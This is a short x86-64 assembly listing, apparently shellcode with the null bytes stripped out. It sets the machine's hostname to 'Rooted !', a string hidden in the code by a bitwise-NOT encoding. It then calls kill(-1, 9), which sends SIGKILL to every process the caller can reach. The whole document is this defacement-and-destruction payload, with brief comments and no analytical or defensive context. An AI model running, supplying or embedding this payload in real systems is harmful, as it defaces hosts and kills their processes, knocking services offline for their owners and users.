global _start

section .text

_start:
	; int sethostname(const char *name, size_t len)
	; rax=170, rdi="Rooted !", rsi=8
	add al, 170
	mov rbx, 0xDEDF9B9A8B9090AD
	not rbx
	push rbx
	push rsp
	pop rdi
	push byte 0x9
	pop rsi
	dec esi
	syscall

	; int kill(pid_t pid, int sig)
	; rax=62, rdi=-1, rsi=9
	push 62
	pop rax
	push r15
	pop rdi
	dec rdi
	inc esi
	syscall
